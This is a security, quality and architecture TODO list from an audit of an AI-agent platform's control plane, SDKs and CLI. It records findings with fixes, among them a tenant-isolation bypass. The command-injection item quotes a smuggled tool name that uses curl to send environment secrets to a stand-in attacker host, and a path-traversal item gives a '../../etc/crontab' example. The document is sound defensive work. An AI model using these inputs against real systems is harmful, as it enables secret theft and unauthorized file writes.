# TODO — Security, Quality, and Architecture

Tracked issues from the codebase audit performed on 2026-03-14.

## Instructions for Contributors

- **Mark complete** by changing `[ ]` to `[x]` when the fix is merged.
- **Remove items** entirely once verified in production for at least one release
  cycle.
- **Add context** by appending a short note with the PR number when completing
  an item, e.g. `[x] Fix thing (#42)`.
- **Severity** reflects risk and urgency. Work top-down within each section.
- Items are grouped by category, then ordered by severity within each group.

---

## 1. Security Issues

### Critical

- [ ] **Tenant isolation bypass via `X-Tenant` header**
      `control-plane/src/middleware/tenant.ts` `resolveTenant` takes `tenantId`
      directly from the `X-Tenant` header, `?tenant=` query param, or
      `ar_tenant` cookie with no check that the authenticated caller belongs to
      that tenant, then calls `ensure(email)` — which **auto-provisions** the
      caller into whatever tenant they named. Any API-token caller can set
      `X-Tenant: other-tenant` and reach another tenant's agents, secrets,
      tools, audit logs, and telemetry.

  **Currently documented as intentional** (`docs/iam.md` → "Tenant Isolation",
  `SECURITY-TODO.md` #13): tenants are modelled as environments
  (`dev`/`staging`/`prod`) within one org, isolation is logical (separate
  SQLite DB + `{tenantId}/` GCS prefix), and the real trust boundary is
  `AR_ALLOWED_DOMAINS` + Google-verified identity. It is left open for the
  frictionless "any org member can use any environment" workflow, and because
  the CLI (`--tenant`/`AR_TENANT`), deployed agents (`AR_TENANT_ID` →
  `X-Tenant` callbacks), and audit all pass the tenant as an out-of-band
  routing hint rather than an identity-bound claim.

  **Key asymmetry to resolve:** the web path is _not_ open — `webAuth`
  (`control-plane/src/middleware/auth.ts`) gates on `getUser(email)` and 403s
  un-invited users ("Not Invited"), while the API path uses `ensure(email)` and
  auto-creates them. So `X-Tenant` on an API token is a real privilege gap even
  within the current model.

  **Best fix:** enforce membership in `resolveTenant`, mirroring `webAuth` —
  replace `ensure(email)` with `get(email)` and return 403 when the caller is
  not a member. Make membership explicit (a `tenant_member` table, or treat a
  per-tenant `user` row as membership) with an admin invite surface
  (`POST /tenants/:id/members` + `ar tenant invite` + UI), and backfill existing
  users on rollout.

  **Tradeoffs:** (1) removes the zero-friction onboarding `ensure()` provides —
  every user must be invited to every tenant, and new tenants need an explicit
  first-member bootstrap; (2) **breaks non-human callers unless allowlisted** —
  the worker SA on agent callbacks, the admin/CI SA on deploys, and the Slack
  bot SA must be provisioned as members or agents/deploys 403 (highest-risk part
  of the change); (3) cross-tenant `copy.ts` and dev→prod promotion must handle
  a caller belonging to both source and target; (4) requires new invite/member
  endpoints, CLI, UI, migration, and tests; (5) necessary but not sufficient for
  true customer isolation — data at rest is still co-mingled in some flows
  (cross-tenant copy + DB sync, `SECURITY-TODO.md` #42), which would additionally
  need physical/credential separation.

### High

- [ ] **Command injection in tool resolution fallback**
      `sdk-agent-nodejs/src/tools.ts:71-101` When `resolveBinary` cannot find a
      tool, it returns the raw `name` string. `execSync(binary, ...)` runs this
      through a shell, so a malicious agent config with a tool name like
      `; curl attacker.com/steal?$(env)` executes arbitrary commands. **Fix:**
      Throw an error when no binary is found instead of falling back to `name`.
      Use `execFileSync` (no shell) instead of `execSync`.

- [ ] **Path traversal in tar extraction** `cli/src/utils/archive.ts:67-82`
      `entry.path` from the archive is joined to `dest` without validation. A
      malicious archive with paths like `../../etc/crontab` writes files outside
      the destination directory. **Fix:** After `join(dest, entry.path)`, verify
      the resolved absolute path starts with `resolve(dest)`.

### Medium

- [ ] **Install scripts receive full `process.env`**
      `sdk-agent-nodejs/src/tools.ts:77-85` Tool install scripts receive the
      entire process environment including secrets. A compromised or malicious
      install script can exfiltrate them. **Fix:** Pass only `PASSTHROUGH_VARS`
      plus `TOOLS_DIR` to install scripts, matching the restricted env pattern
      used in `resolveEnv` when tool config has explicit env mappings.

- [ ] **No CORS or CSP headers configured** `control-plane/src/mod.ts` The
      control plane has no explicit CORS policy or Content-Security-Policy
      headers. Default browser behavior may allow broader cross-origin access
      than intended. **Fix:** Add Hono CORS middleware with an explicit origin
      allowlist. Add CSP headers for the web dashboard routes.

- [ ] **Secrets API does not validate secret names**
      `control-plane/src/api/secrets.ts:13-31` `name` and `agent` fields are not
      validated at the API layer before being passed to `secretSet`. Unusual
      values could cause unexpected behavior. **Fix:** Validate `name` and
      `agent` with the existing `validateId` pattern or a dedicated secret name
      pattern.

- [ ] **Copy API missing input validation** `control-plane/src/api/copy.ts:9-47`
      `slug` and `targetTenant` are not validated with `validateId` or similar
      before use in the copy plan. **Fix:** Add `validateId` checks for `slug`
      and `targetTenant`.

### Low

- [ ] **Audit metadata may contain secrets** `sdk-agent-nodejs/src/audit.ts`
      Audit `metadata` is sent as-is to the control plane. If it contains
      secrets, they are stored in the audit log. `AgentSecurity.sanitize` exists
      but is not applied to audit metadata. **Fix:** Run
      `AgentSecurity.sanitize` on metadata before sending to audit.

- [ ] **Vite proxy defaults to HTTP** `web/vite.config.ts:25-27` The default
      proxy target is `http://localhost:8080`. In production-like environments,
      HTTPS should be used. **Fix:** Default to HTTPS when `AR_CP_URL` is set to
      a non-localhost URL.

- [ ] **Error messages may expose internal details** `cli/src/auth.ts:20` Full
      `stderr` and command line arguments are included in thrown errors. In some
      flows this could leak sensitive information to end users. **Fix:**
      Sanitize error messages before surfacing to users; log full details at
      debug level only.

- [ ] **`AR_DB_PATH` defaults to `/data`** `sdk-client-deno/src/db/mod.ts:19`
      The default path `/data` may not exist or be writable in all environments,
      causing opaque runtime failures. **Fix:** Validate the directory exists
      and is writable at startup, or use a more portable default.

---

## 2. Inefficient Patterns and Bad Practices

### High

- [ ] **Unguarded `JSON.parse` on user input in agent handlers**
      `cli/src/commands/agent.ts:336`,
      `sdk-client-deno/src/templates/agent-default.ts:14` `JSON.parse(req.body)`
      in generated agent function handlers has no try/catch. Malformed request
      bodies crash the agent process. **Fix:** Wrap in try/catch and return a
      400 error for invalid JSON.

- [ ] **Swallowed errors in web dashboard** `web/src/islands/audit.tsx:21-26`
      `.catch(() => {})` silently discards fetch errors with no error state or
      user feedback. The UI appears to work but shows stale or no data. **Fix:**
      Set an error state and display feedback to the user.

### Medium

- [ ] **Global mutable singleton for DB state**
      `sdk-client-deno/src/db/mod.ts:7-9` The entire DB layer is a global
      singleton (`let db`, `let activeTenant`, `let syncTimer`). This prevents
      multi-tenant concurrent access, makes testing impossible without side
      effects, and creates hidden coupling. **Fix:** Use a
      `Map<tenantId, Database>` for multi-tenant access. Pass DB instances as
      parameters instead of relying on global state.

- [ ] **Platform resolved at module import time**
      `sdk-client-deno/src/platform/mod.ts:8-11` Top-level `await loadConfig()`
      locks the platform at import time. Config loading can fail before any code
      runs, and the platform can never be changed or mocked for testing.
      **Fix:** Export a `createPlatform(config)` factory function. Resolve
      lazily on first use or via explicit initialization.

- [ ] **Unguarded `JSON.parse` on config and schema files**
      `sdk-client-deno/src/agent-schema.ts:37-38`,
      `sdk-client-deno/src/rule-schema.ts:28-29`,
      `sdk-client-deno/src/skill-schema.ts:27`,
      `sdk-client-deno/src/tool-schema.ts:54`, `cli/src/settings.ts:104`
      `JSON.parse` on file contents with no try/catch. Invalid or corrupted
      config files crash the process with an unhelpful error. **Fix:** Wrap in
      try/catch and surface clear validation error messages.

- [ ] **Unguarded `JSON.parse` on DB JSON columns**
      `sdk-client-deno/src/db/telemetry.ts:66-74`,
      `sdk-client-deno/src/db/audit.ts:96`,
      `sdk-client-deno/src/db/configs.ts:143`,
      `sdk-client-deno/src/db/registry.ts:279` `JSON.parse` on values read from
      SQLite JSON columns. DB corruption or manual edits cause unhandled
      exceptions. **Fix:** Wrap in try/catch with sensible defaults or error
      propagation.

- [ ] **Migrations not wrapped in transactions**
      `sdk-client-deno/src/db/schema.ts:307-332` Each migration runs via
      `db.exec(sql)` without `BEGIN`/`COMMIT`. A failure mid-migration leaves
      the database in a partially-migrated state with no rollback. **Fix:** Wrap
      each migration in `BEGIN`/`COMMIT` with `ROLLBACK` on error.

- [ ] **Sync errors silently swallowed** `sdk-client-deno/src/db/mod.ts:56-67`
      GCS sync failures in `scheduleSync` are caught and ignored. Data could
      fail to back up for hours without anyone knowing. **Fix:** Log sync
      failures at warning level. Consider a retry mechanism or health check that
      surfaces sync status.

- [ ] **No pagination on list endpoints** `control-plane/src/api/agents.ts`
      `listByTenant` returns all agents with no `limit`/`offset`. As the dataset
      grows, this becomes a performance and memory problem. **Fix:** Add `limit`
      and `offset` query parameters with sensible defaults.

### Low

- [ ] **Node SDK uses `console` instead of structured logger**
      `sdk-agent-nodejs/src/audit.ts:51-88` Direct `console.error` and
      `console.log` calls with no structured logging. Audit entries logged via
      `console.log(JSON.stringify(entry))` may include sensitive user or request
      data. **Fix:** Use a structured logger with level control and ensure
      sensitive fields are sanitized before logging.

- [ ] **Magic numbers for timeouts and intervals**
      `sdk-client-deno/src/platform/gcp-rest.ts`, `sdk-client-deno/src/db/mod.ts`
      Hardcoded values like `300000`, `5000`, `500` scattered across files.
      **Fix:** Extract to named constants or make configurable.

---

## 3. Architecture — Better Alternatives

### High Priority

- [ ] **Add real test coverage** `cli/test/lib.test.ts` The only test file
      contains `2+2` and `Promise.resolve` assertions. There are no unit tests
      for the SDK, DB, CLI commands, or control plane routes.
      **Recommendation:**
  - Unit tests for `sdk-client-deno` (config, registry, platform adapters)
  - DB tests with in-memory SQLite
  - Control plane route tests using Hono's test client
  - Use minimal test config or mocks so tests don't depend on full env

### Medium Priority

- [ ] **Add schema validation for config and API boundaries**
      `sdk-client-deno/src/config.ts`, `cli/src/settings.ts`,
      `sdk-client-deno/src/runtime.ts`, `control-plane/src/api/` Config is
      parsed from JSON/YAML and used with `as` type assertions. API request
      bodies are cast without validation. Invalid values cause runtime crashes
      with unhelpful errors. **Recommendation:** Define Zod schemas for
      `Settings`, `RuntimeConfig`, and all API request/response bodies. Parse
      with `schema.parse()` at boundaries.

- [ ] **Replace global DB singleton with dependency injection**
      `sdk-client-deno/src/db/mod.ts` The global singleton prevents concurrent
      multi-tenant access and testability. **Recommendation:** Create a
      `TenantDb` class that takes a path in its constructor. Use a
      `Map<tenantId, TenantDb>` for multi-tenant access. Pass instances as
      parameters.

- [ ] **Replace top-level platform resolution with factory pattern**
      `sdk-client-deno/src/platform/mod.ts` Top-level `await` locks the platform
      at import time with no reconfiguration or mocking possible.
      **Recommendation:** Export `createPlatform(config): Platform` factory.
      Callers pass config explicitly. This enables testing with mocks and avoids
      import-time side effects.

- [ ] **Add streaming for agent output and logs**
      `cli/src/commands/agent.ts:448-450`,
      `control-plane/src/api/agents.ts:121-124` Agent run buffers the entire
      response with `response.text()`. The logs endpoint returns empty JSON. No
      SSE or WebSocket endpoints exist. **Recommendation:**
  - Use `response.body` (ReadableStream) and pipe to stdout for real-time agent
    output
  - Implement SSE (`text/event-stream`) for the logs endpoint
  - Add an SSE endpoint for real-time agent output

- [ ] **Lazy-load CLI commands** `cli/src/cli.ts:12-54` All commands are
      imported eagerly via top-level `await import()` at startup, slowing
      startup time proportional to the number of commands. **Recommendation:**
      Only import the matched command module after route resolution. Consider
      Cliffy or Commander which handle this natively.

### Low Priority

- [ ] **Add HTTP caching headers** `control-plane/src/mod.ts` No `Cache-Control`
      or ETags for static assets or idempotent GET responses.
      **Recommendation:** Add `Cache-Control` for static assets and short-lived
      caching for idempotent GETs.

- [ ] **Cache registry file reads** `sdk-client-deno/src/registry.ts` Registry
      files are read from disk on every operation with no caching.
      **Recommendation:** Add short-lived in-memory cache for registry reads.

- [ ] **Add mutex around DB sync** `sdk-client-deno/src/db/mod.ts:55-65` Rapid
      mutations can cause sync races. The debounce helps but doesn't prevent
      concurrent sync attempts. **Recommendation:** Add a mutex or queue around
      the sync function.

- [ ] **Batch or parallelize `gcloud` calls**
      `sdk-client-deno/src/platform/gcp.ts` Each GCP operation spawns a separate
      `gcloud` process. Sequential calls accumulate latency. **Recommendation:**
      Batch independent operations with `Promise.all` where possible.

- [ ] **Build control plane for darwin/arm64** `cli/scripts/build.ts:129-151`
      The control plane is always compiled for linux x86_64 only. Local
      development on macOS requires running via source. **Recommendation:** Add
      optional darwin/arm64 target for local development builds.
